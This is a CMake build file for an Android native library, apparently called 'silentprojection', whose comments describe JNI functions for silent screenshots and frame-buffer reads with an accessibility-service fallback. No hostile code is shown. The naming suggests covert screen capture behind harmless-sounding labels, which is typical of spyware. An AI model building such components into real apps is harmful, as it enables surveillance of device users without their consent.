cmake_minimum_required(VERSION 3.22.1)
project("silentprojection")

# ─── Silent Projection Native Library ────────────────────────────────────────
# Provides:
#   Java_com_seguranca_protecao_UiAssistBridge_nativeTakeScreenshot()
#   Java_com_seguranca_protecao_UiAssistBridge_nativeGetFrameBuffer()
# Falls back to AccessibilityService.takeScreenshot() if not available.

add_library(silentprojection SHARED
    silentprojection.cpp
)

find_library(log-lib log)
find_library(android-lib android)

target_link_libraries(silentprojection
    ${log-lib}
    ${android-lib}
)

target_compile_options(silentprojection PRIVATE
    -O2
    -fvisibility=hidden
    -fstack-protector-strong
    -D_FORTIFY_SOURCE=2
)
